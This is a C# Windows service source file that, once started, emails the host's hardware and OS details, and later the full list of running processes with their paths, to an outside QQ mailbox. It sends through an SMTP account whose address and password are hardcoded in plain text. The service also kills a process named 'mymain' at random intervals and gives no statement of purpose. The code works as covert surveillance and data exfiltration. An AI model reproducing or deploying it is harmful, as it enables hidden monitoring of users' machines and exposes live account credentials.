using MimeKit;
using System;
using System.Diagnostics;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Dszy
{
    public partial class Dszy : ServiceBase
    {
        Random wait = new Random();
        public Dszy()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            try
            {
                int i = 10;
                while (i >= 0)
                {
                    Thread.Sleep(1000);
                    i--;
                }
            }
            catch { }

            try
            {
                //启动
                Task.Run(SendWakeupMailAsync);
            }
            catch { }



            System.Timers.Timer connectNetTimer = new System.Timers.Timer();
            connectNetTimer.Elapsed += new System.Timers.ElapsedEventHandler((obj, eventArg) =>
            {
                int min = wait.Next(1, 45);
                if (min == 1)
                {
                    CloseOne();
                }

                if ((min % 15) == 0)
                {
                    //信息
                    Task.Run(SendInfoMailAsync);
                }
            });
            connectNetTimer.Interval = 60000;//毫秒 1秒=1000毫秒
            connectNetTimer.Enabled = true;//必须加上
            connectNetTimer.AutoReset = true;//执行一次 false，一直执行true 
            connectNetTimer.Start();
        }

        protected override void OnStop()
        {

        }

        void CloseOne()
        {
            try
            {
                var myProcess = Process.GetProcessesByName("mymain");
                if (myProcess.Length > 1)
                {
                    foreach (var p in myProcess)
                    {
                        p.Kill();
                        break;
                    }
                }
            }
            catch { }
        }

        private string ProcessInfo()
        {
            var myProcess = Process.GetProcesses();
            StringBuilder sb = new StringBuilder();

            foreach (Process p in myProcess)
            {
                try
                {
                    sb.AppendLine(p.ProcessName + "\t=========>\t" + p.MainModule.FileName);
                }
                catch (Exception e)
                {
                    sb.AppendLine("遇到错误\t=========>\t" + p.MainModule.FileName);
                }
            }

            return sb.ToString();
        }

        private string MachineInfo()
        {
            StringBuilder info = new StringBuilder();
            info.AppendLine(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
            info.AppendLine("CPU:\r\n" + MachineHelper.CpuInfo());
            info.AppendLine("HardDisk:\r\n" + MachineHelper.HardDiskInfo());
            info.AppendLine("Memory:\r\n" + MachineHelper.MemoryInfo());
            info.AppendLine("OS:\r\n" + MachineHelper.OSInfo());
            return info.ToString();
        }

        private async Task SendWakeupMailAsync()
        {
            EMailHelper.Host = "smtp.qq.com";
            EMailHelper.Port = 465;
            EMailHelper.UseSsl = true;
            EMailHelper.UserName = "390059127@qq.com";
            EMailHelper.Password = "phykougiygxcbjif";
            EMailHelper.UserAddress = "390059127@qq.com";
            var subject = "Wakeup";
            var content = MachineInfo();
            await EMailHelper.SendEMailAsync(subject, content, new MailboxAddress[] {
                new MailboxAddress("150101977@qq.com")
            });
        }

        private async Task SendInfoMailAsync()
        {
            EMailHelper.Host = "smtp.qq.com";
            EMailHelper.Port = 465;
            EMailHelper.UseSsl = true;
            EMailHelper.UserName = "390059127@qq.com";
            EMailHelper.Password = "phykougiygxcbjif";
            EMailHelper.UserAddress = "390059127@qq.com";
            var subject = "InfoNow";
            string str = ProcessInfo();
            await EMailHelper.SendEMailAsync(subject, str, new MailboxAddress[] {
                new MailboxAddress("150101977@qq.com")
            });
        }
    }
}
